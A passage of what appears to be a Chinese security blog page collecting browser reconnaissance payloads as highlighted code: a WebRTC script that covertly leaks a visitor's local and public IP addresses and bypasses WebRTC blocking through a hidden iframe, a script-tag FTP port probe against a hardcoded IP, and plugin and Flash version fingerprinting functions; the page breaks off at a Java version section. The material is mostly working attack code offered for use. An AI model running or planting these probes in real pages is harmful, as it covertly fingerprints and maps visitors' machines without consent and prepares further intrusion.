class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"doctype\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"title\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">meta</span> <span class=\"attribute\">http-equiv</span>=<span class=\"value\">\"Content-Type\"</span> <span class=\"attribute\">content</span>=<span class=\"value\">\"text/html; charset=utf-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"title\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"title\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">h4</span>&gt;</span></span><br><span class=\"line\">            Demo for:</span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"https://github.com/diafygi/webrtc-ips\"</span>&gt;</span></span><br><span class=\"line\">                https://github.com/diafygi/webrtc-ips</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"title\">h4</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">p</span>&gt;</span></span><br><span class=\"line\">            This demo secretly makes requests to STUN servers that can log your</span><br><span class=\"line\">            request. These requests do not show up in developer consoles and</span><br><span class=\"line\">            cannot be blocked by browser plugins (AdBlock, Ghostery, etc.).</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"title\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">h4</span>&gt;</span>Your local IP addresses:<span class=\"tag\">&lt;/<span class=\"title\">h4</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">ul</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">ul</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">h4</span>&gt;</span>Your public IP addresses:<span class=\"tag\">&lt;/<span class=\"title\">h4</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">ul</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">ul</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">iframe</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"iframe\"</span> <span class=\"attribute\">sandbox</span>=<span class=\"value\">\"allow-same-origin\"</span> <span class=\"attribute\">style</span>=<span class=\"value\">\"display: none\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"title\">iframe</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"title\">script</span>&gt;</span><span class=\"javascript\"></span><br><span class=\"line\">            <span class=\"comment\">//get the IP addresses associated with an account</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getIPs</span><span class=\"params\">(callback)</span></span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> ip_dups = &#123;&#125;;</span><br><span class=\"line\">                <span class=\"comment\">//compatibility for firefox and chrome</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> RTCPeerConnection = <span class=\"built_in\">window</span>.RTCPeerConnection</span><br><span class=\"line\">                    || <span class=\"built_in\">window</span>.mozRTCPeerConnection</span><br><span class=\"line\">                    || <span class=\"built_in\">window</span>.webkitRTCPeerConnection;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> useWebKit = !!<span class=\"built_in\">window</span>.webkitRTCPeerConnection;</span><br><span class=\"line\">                <span class=\"comment\">//bypass naive webrtc blocking using an iframe</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!RTCPeerConnection)&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//NOTE: you need to have an iframe in the page right above the script tag</span></span><br><span class=\"line\">                    <span class=\"comment\">//</span></span><br><span class=\"line\">                    <span class=\"comment\">//&lt;iframe id=\"iframe\" sandbox=\"allow-same-origin\" style=\"display: none\"&gt;&lt;/iframe&gt;</span></span><br><span class=\"line\">                    <span class=\"comment\">//&lt;script&gt;...getIPs called in here...</span></span><br><span class=\"line\">                    <span class=\"comment\">//</span></span><br><span class=\"line\">                    <span class=\"keyword\">var</span> win = iframe.contentWindow;</span><br><span class=\"line\">                    RTCPeerConnection = win.RTCPeerConnection</span><br><span class=\"line\">                        || win.mozRTCPeerConnection</span><br><span class=\"line\">                        || win.webkitRTCPeerConnection;</span><br><span class=\"line\">                    useWebKit = !!win.webkitRTCPeerConnection;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//minimal requirements for data connection</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> mediaConstraints = &#123;</span><br><span class=\"line\">                    optional: [&#123;RtpDataChannels: <span class=\"literal\">true</span>&#125;]</span><br><span class=\"line\">                &#125;;</span><br><span class=\"line\">                <span class=\"comment\">//firefox already has a default stun server in about:config</span></span><br><span class=\"line\">                <span class=\"comment\">//    media.peerconnection.default_iceservers =</span></span><br><span class=\"line\">                <span class=\"comment\">//    [&#123;\"url\": \"stun:stun.services.mozilla.com\"&#125;]</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> servers = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\">                <span class=\"comment\">//add same stun server for chrome</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(useWebKit)</span><br><span class=\"line\">                    servers = &#123;iceServers: [&#123;urls: <span class=\"string\">\"stun:stun.services.mozilla.com\"</span>&#125;]&#125;;</span><br><span class=\"line\">                <span class=\"comment\">//construct a new RTCPeerConnection</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> pc = <span class=\"keyword\">new</span> RTCPeerConnection(servers, mediaConstraints);</span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleCandidate</span><span class=\"params\">(candidate)</span></span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//match just the IP address</span></span><br><span class=\"line\">                    <span class=\"keyword\">var</span> ip_regex = <span class=\"regexp\">/([0-9]&#123;1,3&#125;(\\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span></span><br><span class=\"line\">                    <span class=\"keyword\">var</span> ip_addr = ip_regex.exec(candidate)[<span class=\"number\">1</span>];</span><br><span class=\"line\">                    <span class=\"comment\">//remove duplicates</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(ip_dups[ip_addr] === <span class=\"literal\">undefined</span>)</span><br><span class=\"line\">                        callback(ip_addr);</span><br><span class=\"line\">                    ip_dups[ip_addr] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//listen for candidate events</span></span><br><span class=\"line\">                pc.onicecandidate = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(ice)</span></span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//skip non-candidate events</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(ice.candidate)</span><br><span class=\"line\">                        handleCandidate(ice.candidate.candidate);</span><br><span class=\"line\">                &#125;;</span><br><span class=\"line\">                <span class=\"comment\">//create a bogus data channel</span></span><br><span class=\"line\">                pc.createDataChannel(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">                <span class=\"comment\">//create an offer sdp</span></span><br><span class=\"line\">                pc.createOffer(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(result)</span></span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//trigger the stun server request</span></span><br><span class=\"line\">                    pc.setLocalDescription(result, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;&#125;, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;&#125;);</span><br><span class=\"line\">                &#125;, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;&#125;);</span><br><span class=\"line\">                <span class=\"comment\">//wait for a while to let everything done</span></span><br><span class=\"line\">                setTimeout(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//read candidate info from local description</span></span><br><span class=\"line\">                    <span class=\"keyword\">var</span> lines = pc.localDescription.sdp.split(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">                    lines.forEach(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(line)</span></span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(line.indexOf(<span class=\"string\">'a=candidate:'</span>) === <span class=\"number\">0</span>)</span><br><span class=\"line\">                            handleCandidate(line);</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//insert IP addresses into the page</span></span><br><span class=\"line\">            getIPs(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(ip)</span></span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> li = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"li\"</span>);</span><br><span class=\"line\">                li.textContent = ip;</span><br><span class=\"line\">                <span class=\"comment\">//local IPs</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ip.match(<span class=\"regexp\">/^(192\\.168\\.|169\\.254\\.|10\\.|172\\.(1[6-9]|2\\d|3[01]))/</span>))</span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"ul\"</span>)[<span class=\"number\">0</span>].appendChild(li);</span><br><span class=\"line\">                <span class=\"comment\">//assume the rest are public IPs</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span></span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"ul\"</span>)[<span class=\"number\">1</span>].appendChild(li);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        </span><span class=\"tag\">&lt;/<span class=\"title\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"title\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"FTP端口扫描\">FTP端口扫描</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">script</span> <span class=\"attribute\">src</span>=<span class=\"value\">\"ftp://50.116.13.6\"</span> <span class=\"attribute\">onload</span>=<span class=\"value\">\"alert('21 open')\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"title\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"获取浏览器插件列表：\">获取浏览器插件列表：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">plugin_list</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> agent = navigator.userAgent.toLowerCase();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> all = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (navigator.plugins &amp;&amp; navigator.plugins.length)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (x = <span class=\"number\">0</span>; x &lt; navigator.plugins.length; x++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            all.push(navigator.plugins[x].name.replace(<span class=\"regexp\">/,/g</span>, <span class=\"string\">\" \"</span>) + <span class=\"string\">\"(Name:\"</span> + navigator.plugins[x].filename.replace(<span class=\"regexp\">/,/g</span>, <span class=\"string\">\" \"</span>) + <span class=\"string\">\")\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    all=all.join(<span class=\"string\">\"\\r\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> all;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">alert(plugin_list());</span><br></pre></td></tr></table></figure>\n<h2 id=\"获取flash版本\">获取flash版本</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">flashver</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> flash = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;&#125;;</span><br><span class=\"line\">    flash.prototype.controlVersion = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> version;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> axo;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> e;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            axo = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash.7\"</span>);</span><br><span class=\"line\">            version = axo.GetVariable(<span class=\"string\">\"$version\"</span>)</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(e) &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!version) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                axo = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash.6\"</span>);</span><br><span class=\"line\">                version = <span class=\"string\">\"WIN 6,0,21,0\"</span>;</span><br><span class=\"line\">                axo.AllowScriptAccess = <span class=\"string\">\"always\"</span>;</span><br><span class=\"line\">                version = axo.GetVariable(<span class=\"string\">\"$version\"</span>)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(e) &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!version) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                axo = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash.3\"</span>);</span><br><span class=\"line\">                version = axo.GetVariable(<span class=\"string\">\"$version\"</span>)</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(e) &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!version) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                axo = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash.3\"</span>);</span><br><span class=\"line\">                version = <span class=\"string\">\"WIN 3,0,18,0\"</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(e) &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!version) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                axo = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ShockwaveFlash.ShockwaveFlash\"</span>);</span><br><span class=\"line\">                version = <span class=\"string\">\"WIN 2,0,0,11\"</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(e) &#123;</span><br><span class=\"line\">                version = -<span class=\"number\">1</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> verArr = version.toString().split(<span class=\"string\">\",\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> str = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>,</span><br><span class=\"line\">        l = verArr.length; i &lt; l; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (verArr[i].indexOf(<span class=\"string\">\"WIN\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                str += verArr[i].substring(<span class=\"number\">3</span>);</span><br><span class=\"line\">                str += <span class=\"string\">\".\"</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (i == (l - <span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">                    str += verArr[i]</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    str += verArr[i];</span><br><span class=\"line\">                    str += <span class=\"string\">\".\"</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (str)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    flash.prototype.getSwfVer = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> isIE = (navigator.appVersion.indexOf(<span class=\"string\">\"MSIE\"</span>) != -<span class=\"number\">1</span>) ? <span class=\"literal\">true</span>: <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> isWin = (navigator.appVersion.toLowerCase().indexOf(<span class=\"string\">\"win\"</span>) != -<span class=\"number\">1</span>) ? <span class=\"literal\">true</span>: <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> isOpera = (navigator.userAgent.indexOf(<span class=\"string\">\"Opera\"</span>) != -<span class=\"number\">1</span>) ? <span class=\"literal\">true</span>: <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> flashVer = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (navigator.plugins != <span class=\"literal\">null</span> &amp;&amp; navigator.plugins.length &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (navigator.plugins[<span class=\"string\">\"Shockwave Flash 2.0\"</span>] || navigator.plugins[<span class=\"string\">\"Shockwave Flash\"</span>]) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> swVer2 = navigator.plugins[<span class=\"string\">\"Shockwave Flash 2.0\"</span>] ? <span class=\"string\">\" 2.0\"</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> flashDescription = navigator.plugins[<span class=\"string\">\"Shockwave Flash\"</span> + swVer2].description;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> descArray = flashDescription.split(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> tempArrayMajor = descArray[<span class=\"number\">2</span>].split(<span class=\"string\">\".\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">var</span> versionMajor = tempArrayMajor[<span class=\"number\">0</span>];</span><br><span class=\"line\">                <span class=\"keyword\">var</span> versionMinor = tempArrayMajor[<span class=\"number\">1</span>];</span><br><span class=\"line\">                <span class=\"keyword\">var</span> versionRevision = descArray[<span class=\"number\">3</span>];</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (versionRevision == <span class=\"string\">\"\"</span>) &#123;</span><br><span class=\"line\">                    versionRevision = descArray[<span class=\"number\">4</span>]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (versionRevision[<span class=\"number\">0</span>] == <span class=\"string\">\"d\"</span>) &#123;</span><br><span class=\"line\">                    versionRevision = versionRevision.substring(<span class=\"number\">1</span>)</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (versionRevision[<span class=\"number\">0</span>] == <span class=\"string\">\"r\"</span>) &#123;</span><br><span class=\"line\">                        versionRevision = versionRevision.substring(<span class=\"number\">1</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (versionRevision.indexOf(<span class=\"string\">\"d\"</span>) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                            versionRevision = versionRevision.substring(<span class=\"number\">0</span>, versionRevision.indexOf(<span class=\"string\">\"d\"</span>))</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> flashVer = versionMajor + <span class=\"string\">\".\"</span> + versionMinor + <span class=\"string\">\".\"</span> + versionRevision</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (navigator.userAgent.toLowerCase().indexOf(<span class=\"string\">\"webtv/2.6\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                flashVer = <span class=\"number\">4</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (navigator.userAgent.toLowerCase().indexOf(<span class=\"string\">\"webtv/2.5\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    flashVer = <span class=\"number\">3</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (navigator.userAgent.toLowerCase().indexOf(<span class=\"string\">\"webtv\"</span>) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                        flashVer = <span class=\"number\">2</span></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (isIE &amp;&amp; isWin &amp;&amp; !isOpera) &#123;</span><br><span class=\"line\">                            flashVer = <span class=\"keyword\">new</span> flash().controlVersion()</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> flashVer</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (flash.prototype.getSwfVer() == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Flash!\"</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Shockwave Flash \"</span> + flash.prototype.getSwfVer()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">alert(flashver());</span><br></pre></td></tr></table></figure>\n<h2 id=\"获取Java版本\">获取Java版本</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 